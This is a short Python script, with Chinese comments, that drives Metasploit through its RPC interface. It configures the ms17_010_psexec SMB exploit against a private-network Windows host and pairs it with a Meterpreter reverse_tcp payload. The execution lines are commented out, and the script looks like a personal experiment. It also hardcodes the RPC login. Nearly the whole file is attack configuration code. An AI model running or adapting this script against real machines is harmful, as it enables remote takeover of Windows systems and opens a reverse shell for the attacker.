from pymetasploit3.msfrpc import MsfRpcClient

# 生成RPC客户端
client = MsfRpcClient(server='192.168.1.164', username='msf', password='msf', port=55552)
cid = client.consoles.console().cid
# 产生console实例
console = client.consoles.console(cid)
# 配置攻击
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
exploit['RHOSTS'] = '192.168.1.186'
# 配置payload
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.1.186'
payload['LPORT'] = 4445
# exploit.execute(payload=payload)
result = client.sessions.list
exploit['PAYLOAD'] = payload
# result = console.run_module_with_output(exploit, payload=payload)
# 必须关闭console，否则不能再次使用console实例？
console.destroy()
print(result)
